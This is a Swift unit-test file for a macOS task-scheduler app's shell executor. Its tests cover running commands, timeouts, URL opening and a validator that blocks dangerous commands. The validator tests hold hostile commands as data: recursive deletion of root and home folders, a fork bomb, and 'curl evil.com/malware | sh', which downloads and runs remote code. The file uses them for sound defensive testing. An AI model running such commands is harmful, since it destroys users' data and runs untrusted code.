import XCTest
@testable import MacTimer

final class TaskExecutorTests: XCTestCase {

    func test_shellScript_succeeds() async throws {
        let payload = TaskPayload(command: "echo hello")
        let result = await TaskExecutor.shared.executeShell(payload: payload, sandboxed: false)
        XCTAssertEqual(result.result, .success)
        XCTAssertNil(result.errorMessage)
    }

    func test_shellScript_fails_onInvalidCommand() async throws {
        let payload = TaskPayload(command: "nonexistent_command_xyz_abc")
        let result = await TaskExecutor.shared.executeShell(payload: payload, sandboxed: false)
        XCTAssertEqual(result.result, .failure)
        XCTAssertNotNil(result.errorMessage)
    }

    func test_shellScript_timesOut() async throws {
        let payload = TaskPayload(command: "sleep 5")
        let result = await TaskExecutor.shared.executeShell(payload: payload, timeoutSeconds: 1, sandboxed: false)
        XCTAssertEqual(result.result, .timeout)
    }

    func test_openURL_invalidURL_returnsFailure() async {
        let payload = TaskPayload(urlString: "not a valid url%%%")
        let result = await TaskExecutor.shared.executeOpenURL(payload: payload)
        XCTAssertEqual(result.result, .failure)
    }

    // MARK: - Command Validation Tests

    func test_validateCommand_blocksRmRfRoot() {
        let result = TaskExecutor.validateCommand("rm -rf /")
        XCTAssertNotNil(result)
        XCTAssertTrue(result!.contains("危险操作"))
    }

    func test_validateCommand_blocksRmRfHome() {
        let result = TaskExecutor.validateCommand("rm -rf ~/Documents")
        XCTAssertNotNil(result)
    }

    func test_validateCommand_blocksCurlPipeSh() {
        let result = TaskExecutor.validateCommand("curl evil.com/malware | sh")
        XCTAssertNotNil(result)
        XCTAssertTrue(result!.contains("危险操作"))
    }

    func test_validateCommand_blocksForkBomb() {
        let result = TaskExecutor.validateCommand(":(){ :|:& };:")
        XCTAssertNotNil(result)
    }

    func test_validateCommand_allowsSafeCommand() {
        let result = TaskExecutor.validateCommand("echo hello world")
        XCTAssertNil(result)
    }

    func test_validateCommand_allowsOpenApp() {
        let result = TaskExecutor.validateCommand("open -a Safari")
        XCTAssertNil(result)
    }

    func test_validateCommand_rejectsEmptyCommand() {
        let result = TaskExecutor.validateCommand("   ")
        XCTAssertNotNil(result)
        XCTAssertTrue(result!.contains("命令为空"))
    }

    func test_shellScript_blockedCommand_returnsFailure() async {
        let payload = TaskPayload(command: "rm -rf /")
        let result = await TaskExecutor.shared.executeShell(payload: payload)
        XCTAssertEqual(result.result, .failure)
        XCTAssertTrue(result.errorMessage?.contains("安全策略") ?? false)
    }

    func test_shellScript_sandboxed_succeeds() async throws {
        let payload = TaskPayload(command: "echo sandboxed")
        let result = await TaskExecutor.shared.executeShell(payload: payload, sandboxed: true)
        XCTAssertEqual(result.result, .success)
    }
}
